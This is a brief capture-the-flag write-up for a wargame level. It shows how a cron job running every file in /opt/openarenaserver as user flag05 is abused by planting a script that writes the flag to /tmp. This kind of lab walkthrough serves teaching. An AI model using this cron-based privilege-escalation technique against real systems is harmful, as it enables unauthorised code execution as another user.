When we connect, we have a message: you have new mail
when we go in the folder /var/mail, there is a file level05, with the following line:
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
which appears to be a cron command to execute the openarenaserver script every 2 minutes

the file openarenaserver contains the following shell script
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

which iterates over all files in the folder /opt/openarenaserver,
sets a time limit of 5 seconds for the execution of the next command, execute the file in bash
then it removes the file

When we create file in the /opt/openarenaserver folder they are regularly deleted
this hints that the cron task in the level05 file must be already set up

We can simply write a script in the /opt/openarenaserver folder that we get us the file
#!/bin/bash

getflag > /tmp/flag
we then wait that the cron task is executed (our file in /opt/openarenaserver will be deleted)
And we get the flag in our /tmp/flag file
